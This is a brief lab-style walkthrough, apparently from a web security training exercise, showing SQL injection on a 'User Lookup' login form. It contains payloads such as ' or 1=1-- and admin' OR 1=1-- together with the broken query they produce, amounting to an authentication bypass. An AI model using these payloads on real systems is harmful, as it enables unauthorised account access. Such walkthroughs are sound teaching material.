#### User Lookup (SQL)

- Demo

![](images/1.png)

![](images/2.png)

![](images/3.png)

![](images/4.png)

- Payload

```
Username: ' or 1=1-- 
Password: blah
```

###### Inspect

```
admin'
```

```mysql
SELECT * FROM accounts WHERE username='admin'' AND password=''
```

![](images/5.png)

```
'--
```

![](images/6.png)

```
admin' OR 1=1-- 
```

![](images/7.png)